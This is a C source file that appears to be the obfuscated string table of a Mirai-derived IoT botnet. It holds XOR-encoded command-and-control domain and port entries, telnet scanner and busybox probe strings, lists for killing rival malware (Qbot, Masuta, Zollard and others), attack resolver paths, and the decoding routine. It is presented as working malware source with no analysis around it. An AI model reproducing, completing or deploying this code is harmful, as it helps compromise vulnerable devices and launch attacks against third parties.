#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_DOMAIN, "\x40\x4D\x43\x56\x4C\x47\x56\x0C\x5A\x5B\x58\x22", 12); // use ./enc string [domain] in folder debug
    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, "\x40\x4D\x43\x56\x4C\x47\x56\x0C\x5A\x5B\x58\x22", 12); // use ./enc string [domain] in folder debug
    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101

    add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);

	
    add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7);
    add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);
    add_entry(TABLE_KILLER_FD, "\x0D\x44\x46\x22", 4);
	add_entry(TABLE_KILLER_TCP, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x56\x41\x52\x22", 14);
	add_entry(TABLE_KILLER_MAPS, "\x0D\x4F\x43\x52\x51\x22", 6);
	add_entry(TABLE_KILLER_STATUS, "\x0D\x51\x56\x43\x56\x57\x51\x22", 8);
	add_entry(TABLE_KILLER_ANIME, "\x0C\x43\x4C\x4B\x4F\x47\x22", 7);
    add_entry(TABLE_MEM_ROUTE, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x50\x4D\x57\x56\x47\x22", 16);
    add_entry(TABLE_MEM_CPUINFO, "\x0D\x52\x50\x4D\x41\x0D\x41\x52\x57\x4B\x4C\x44\x4D\x22", 14);
    add_entry(TABLE_MEM_BOGO, "\x60\x6D\x65\x6D\x6F\x6B\x72\x71\x22", 9);
	add_entry(TABLE_MEM_RC, "\x0D\x47\x56\x41\x0D\x50\x41\x0C\x46\x0D\x50\x41\x0C\x4E\x4D\x41\x43\x4E\x22", 19);
	add_entry(TABLE_MEM_MASUTA1, "\x45\x13\x43\x40\x41\x16\x46\x4F\x4D\x11\x17\x4A\x4C\x52\x10\x4E\x4B\x47\x12\x49\x48\x44\x22", 23);
	add_entry(TABLE_MEM_MASUTA2, "\x43\x51\x51\x55\x4D\x50\x46\x22", 8);
	add_entry(TABLE_MEM_MIRAI1, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);
	add_entry(TABLE_MEM_MIRAI2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19);
	add_entry(TABLE_MEM_VAMP1, "\x0D\x46\x47\x54\x0D\x64\x76\x75\x66\x76\x13\x12\x13\x7D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 23);
    add_entry(TABLE_MEM_VAMP2, "\x0D\x46\x47\x54\x0D\x64\x76\x75\x66\x76\x13\x12\x13\x02\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 24);
	add_entry(TABLE_MEM_VAMP3, "\x0D\x46\x47\x54\x0D\x4C\x47\x56\x51\x4E\x4B\x4C\x49\x22", 15);
    add_entry(TABLE_MEM_QBOT, "\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22", 13);
    add_entry(TABLE_MEM_QBOT2, "\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22", 10);
    add_entry(TABLE_MEM_QBOT3, "\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22", 10);
    add_entry(TABLE_MEM_UPX, "\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22", 33);
    add_entry(TABLE_MEM_ZOLLARD, "\x58\x4D\x4E\x4E\x43\x50\x46\x22", 8);
    add_entry(TABLE_MEM_REMAITEN, "\x65\x67\x76\x6E\x6D\x61\x63\x6E\x6B\x72\x22", 11);
    add_entry(TABLE_KILLER_TCP, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x56\x41\x52\x22", 14);
    add_entry(TABLE_MAPS_MIRAI, "\x46\x54\x50\x6A\x47\x4E\x52\x47\x50\x22", 10);

    add_entry(TABLE_SCAN_SHELL, "\x51\x4A\x47\x4E\x4E\x22", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x47\x4C\x43\x40\x4E\x47\x22", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x51\x5B\x51\x56\x47\x4F\x22", 7);
    add_entry(TABLE_SCAN_SH, "\x51\x4A\x22", 3);
    add_entry(TABLE_SCAN_QUERY, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x6F\x6B\x70\x63\x6B\x22", 19);
    add_entry(TABLE_SCAN_RESP, "\x6F\x6B\x70\x63\x6B\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22", 24);
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9);
    add_entry(TABLE_SCAN_PS, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x52\x51\x22", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x49\x4B\x4E\x4E\x02\x0F\x1B\x02\x22", 22);

    add_entry(TABLE_ATK_VSE, "\x76\x71\x4D\x57\x50\x41\x47\x02\x67\x4C\x45\x4B\x4C\x47\x02\x73\x57\x47\x50\x5B\x22", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);
	add_entry(TABLE_MISC_WATCHDOG, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14);
	add_entry(TABLE_MISC_WATCHDOG2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
